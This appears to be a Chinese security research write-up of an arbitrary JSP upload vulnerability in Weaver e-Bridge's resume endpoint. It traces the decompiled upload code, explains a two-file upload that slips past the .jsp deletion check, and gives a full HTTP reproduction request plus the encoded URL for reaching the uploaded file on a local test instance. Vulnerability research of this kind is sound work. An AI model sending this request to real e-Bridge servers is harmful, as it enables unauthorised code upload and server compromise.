
## 环境搭建

```
https://wxdownload.e-cology.com.cn/ebridge/ebridge_install_win64_server2008R2_20200819.zip
```

下载Windows版本的泛微云桥e-Bridge，解压后目录结构

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408061449716.png)

第一次运行后需要打补丁

```
https://wxdownload.e-cology.com.cn/ebridge/ebridge_patch_20230724.zip 
```

解压文件，得到一个“ROOT”文件夹，直接覆盖到自己泛微云桥目录即可

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408071923500.png)


![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408061453273.png)

具体启动参考`泛微云桥windows版安装说明.txt ` ，当前版本：20230724SP2

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408071925244.png)


### ResumeController.class

漏洞处：`webapps\ROOT\WEB-INF\classes\weaver\weixin\app\recruit\controller\ResumeController.class`

```java
  @ActionKey("/wxclient/app/recruit/resume/addResume")
  @Before({Tx.class})
  public void addResume() throws Exception {
    try {
      WxBaseFile wbFile = null;
      if (getContentType().toLowerCase().startsWith("multipart/form-data"))
        wbFile = getWxBaseFile(this.wxBaseFileService, getPara("fileElementId"), null, 2097152, null); 
      ResumeModel model = (ResumeModel)getModel(ResumeModel.class, "resume");
      if (wbFile != null)
        model.set("accessory", wbFile.getId()); 
      if (this.resumeService.addResume(model, getPara("sysagentid"))) {
        renderJsonMsgForIE(", true);
      } else {
        renderJsonMsgForIE(", false);
      } 
    } catch (Exception e) {
      if (e.getMessage().indexOf("2097152") != -1) {
        renderJsonMsgForIE(", false);
      } else {
        this.log.error(e.getMessage(), e);
        renderJsonMsgForIE(", false);
      } 
      throw e;
    } 
  }
```
## getWxBaseFile代码

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408071449418.png)

```java
      String _filePath = StrKit.isBlank(filePath) ? FileUploadTools.getRandomFilePath() : filePath;
      int _fileMaxSize = fileMaxSize == -1 ? FileUploadTools.getMaxSize() : fileMaxSize;
      String _fileEncoding = StrKit.isBlank(fileEncoding) ? FileUploadTools.getEncoding() : fileEncoding;
```

1、 `filePath` 为 null、空字符串或只包含空格，则使用 `FileUploadTools.getRandomFilePath()` 生成一个随机文件路径。
2、 `fileMaxSize` 等于 -1，则使用 `FileUploadTools.getMaxSize()` 获取最大文件大小（默认为 20MB）。
3、 `fileEncoding` 为 null、空字符串或只包含空格，则使用 `FileUploadTools.getEncoding()` 获取文件编码（默认为 "UTF-8"）。

```java
   public WxBaseFile getWxBaseFile(WxBaseFileService wxBaseFileService, String parameterName, String filePath, int fileMaxSize, String fileEncoding) throws Exception {
      String _filePath = StrKit.isBlank(filePath) ? FileUploadTools.getRandomFilePath() : filePath;
      int _fileMaxSize = fileMaxSize == -1 ? FileUploadTools.getMaxSize() : fileMaxSize;
      String _fileEncoding = StrKit.isBlank(fileEncoding) ? FileUploadTools.getEncoding() : fileEncoding;
      UploadFile uf = null;

      try {
         uf = this.getFile(parameterName, _filePath, _fileMaxSize, _fileEncoding);
      } catch (Exception var11) {
         throw var11;
      }

      return this.parseUploadFile(wxBaseFileService, uf);
   }

```

### FileUploadTools.getRandomFilePath()

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408071501052.png)


```java
   public static String initFilePath(String prePath) {
      StringBuffer sb = new StringBuffer();
      if (GCONST.getFileRootPath() != null && !"".equals(GCONST.getFileRootPath())) {
         sb.append(GCONST.getFileRootPath());
      } else {
         sb.append(PathKit.getWebRootPath() + File.separator + "upload");
      }

      if (StrKit.notBlank(prePath)) {
         sb.append(File.separator + prePath + File.separator + sdf.format(new Date()));
      } else {
         sb.append(File.separator + sdf.format(new Date()));
      }

      sb.append(File.separator + getUpEng());
      return sb.toString();
   }

   public static String getUpEng() {
      Random r = new Random();
      char c = (char)(r.nextInt(26) + 65);
      char b = (char)(r.nextInt(26) + 65);
      return String.valueOf(c) + String.valueOf(b);
   }

```

` initFilePath `方法初始化并返回一个文件路径字符串。它接受一个可选的前缀路径参数 `prePath`。如果 `prePath` 为 null 或空字符串，则使用默认前缀。

 `getUpEng()` 方法生成的随机两字母字符串附加到路径末尾，如：/upload/202408/AB

### jfinal框架 UploadFile.getFile 

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408081120798.png)



```java
UploadFile uf = null;
uf = this.getFile(parameterName, _filePath, _fileMaxSize, _fileEncoding);
```

`this.getFile `  实现使用了`jfinal`框架的上传方法

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408081132858.png)

根据Jfinal框架文档，getFile文件上传最后实现的方法`wrapMultipartRequest` 

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408081138159.png)

在80行代码中，if判断了`isSafeFile` 

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408081301296.png)

### isSafeFile

在isSafeFile 方法中，传入的文件名如果是jsp后缀的，就会执行 `delete()` 将上传的jsp文件删除

```java
   private boolean isSafeFile(UploadFile uploadFile) {
      if (uploadFile.getFileName().toLowerCase().endsWith(".jsp")) {
         uploadFile.getFile().delete();
         return false;
      } else {
         return true;
      }
   }

```


### MultipartRequest 代码

从wrapMultipartRequest 方法中，发现将文件流传入的`new com.oreilly.servlet.MultipartRequest`

```java
   private void wrapMultipartRequest(HttpServletRequest request, String saveDirectory, int maxPostSize, String encoding) {
      if (!isMultipartSupported) {
         throw new RuntimeException("Oreilly cos.jar is not found, Multipart post can not be supported.");
      } else {
         saveDirectory = this.handleSaveDirectory(saveDirectory);
         File dir = new File(saveDirectory);
         if (!dir.exists() && !dir.mkdirs()) {
            throw new RuntimeException("Directory " + saveDirectory + " not exists and can not create directory.");
         } else {
            this.uploadFiles = new ArrayList();

            try {
               this.multipartRequest = new com.oreilly.servlet.MultipartRequest(request, saveDirectory, maxPostSize, encoding, fileRenamePolicy);
               Enumeration files = this.multipartRequest.getFileNames();

               while(files.hasMoreElements()) {
                  String name = (String)files.nextElement();
                  String filesystemName = this.multipartRequest.getFilesystemName(name);
                  if (filesystemName != null) {
                     String originalFileName = this.multipartRequest.getOriginalFileName(name);
                     String contentType = this.multipartRequest.getContentType(name);
                     UploadFile uploadFile = new UploadFile(name, saveDirectory, filesystemName, originalFileName, contentType);
                     if (this.isSafeFile(uploadFile)) {
                        this.uploadFiles.add(uploadFile);
                     }
                  }
               }

            } catch (IOException var12) {
               throw new RuntimeException(var12);
            }
         }
      }
   }

```

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408081305487.png)


```java
public MultipartRequest(HttpServletRequest request, String saveDirectory, int maxPostSize, String encoding, FileRenamePolicy policy) throws IOException {
      this.parameters = new Hashtable();
      this.files = new Hashtable();
      if (request == null) {
         throw new IllegalArgumentException("request cannot be null");
      } else if (saveDirectory == null) {
         throw new IllegalArgumentException("saveDirectory cannot be null");
      } else if (maxPostSize <= 0) {
         throw new IllegalArgumentException("maxPostSize must be positive");
      } else {
         File dir = new File(saveDirectory);
         if (!dir.isDirectory()) {
            throw new IllegalArgumentException("Not a directory: " + saveDirectory);
         } else if (!dir.canWrite()) {
            throw new IllegalArgumentException("Not writable: " + saveDirectory);
         } else {
            MultipartParser parser = new MultipartParser(request, maxPostSize, true, true, encoding);
            Vector existingValues;
            if (request.getQueryString() != null) {
               Hashtable queryParameters = HttpUtils.parseQueryString(request.getQueryString());
               Enumeration queryParameterNames = queryParameters.keys();

               while(queryParameterNames.hasMoreElements()) {
                  Object paramName = queryParameterNames.nextElement();
                  String[] values = (String[])((String[])queryParameters.get(paramName));
                  existingValues = new Vector();

                  for(int i = 0; i < values.length; ++i) {
                     existingValues.add(values[i]);
                  }

                  this.parameters.put(paramName, existingValues);
               }
            }

            Part part;
            while((part = parser.readNextPart()) != null) {
               String name = part.getName();
               if (name == null) {
                  throw new IOException("Malformed input: parameter name missing (known Opera 7 bug)");
               }

               String fileName;
               if (part.isParam()) {
                  ParamPart paramPart = (ParamPart)part;
                  fileName = paramPart.getStringValue();
                  existingValues = (Vector)this.parameters.get(name);
                  if (existingValues == null) {
                     existingValues = new Vector();
                     this.parameters.put(name, existingValues);
                  }

                  existingValues.addElement(fileName);
               } else if (part.isFile()) {
                  FilePart filePart = (FilePart)part;
                  fileName = filePart.getFileName();
                  if (fileName != null) {
                     filePart.setRenamePolicy(policy);
                     filePart.writeTo(dir);
                     this.files.put(name, new UploadedFile(dir.toString(), filePart.getFileName(), fileName, filePart.getContentType()));
                  } else {
                     this.files.put(name, new UploadedFile((String)null, (String)null, (String)null, (String)null));
                  }
               }
            }

         }
      }
   }

```

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408081309991.png)

这个部分代码处理了文件上传，将文件保存在指定目录中

```java
      FilePart filePart = (FilePart)part;
                  fileName = filePart.getFileName();
                  if (fileName != null) {
                     filePart.setRenamePolicy(policy);
                     filePart.writeTo(dir);
                     this.files.put(name, new UploadedFile(dir.toString(), filePart.getFileName(), fileName, filePart.getContentType()));
                  } else {
                     this.files.put(name, new UploadedFile((String)null, (String)null, (String)null, (String)null));
                  }

```

主要需要绕过`isSafeFile` 函数删除jsp文件，可通过双文件上传绕过

## 漏洞复现

```java
POST /wxclient/app/recruit/resume/addResume?fileElementId=H HTTP/1.1
Host: 127.0.0.1:8088
Content-Length: 361
Cache-Control: max-age=0
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryD5Mawpg068t7pbxZ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryD5Mawpg068t7pbxZ
Content-Disposition: form-data; name="file"; filename="1.jsp"

127
------WebKitFormBoundaryD5Mawpg068t7pbxZ
Content-Disposition: form-data; name="file"; filename="222.jsp"

127
------WebKitFormBoundaryD5Mawpg068t7pbxZ--
```
![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408081318839.png)

从文件监控中，通过双文件上传，成功创建了两个文件`1.jsp 222.jsp` ，只有1.jsp成功上传漏洞，222.jsp被删除了

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408081319517.png)

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408081320499.png)

访问：`http://127.0.0.1:8088/upload/202408/RE/1.js%70`

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408081321656.png)

